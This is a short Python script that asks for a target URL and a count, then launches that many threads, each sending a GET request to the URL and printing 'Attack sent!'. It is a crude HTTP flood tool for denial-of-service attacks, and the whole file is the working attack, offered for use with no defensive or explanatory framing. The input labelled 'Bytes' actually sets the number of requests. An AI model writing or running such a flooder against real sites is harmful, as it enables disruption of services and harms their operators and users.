import threading, requests

url = input("URL: ")
byte_s = int(input("Bytes: "))


def r_send():
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"\033[32m[+]\033[0m Attack sent!")

    except Exception as err:
        print(err)


for i in range(byte_s):
    thread = threading.Thread(target=r_send)
    thread.start()

input("")

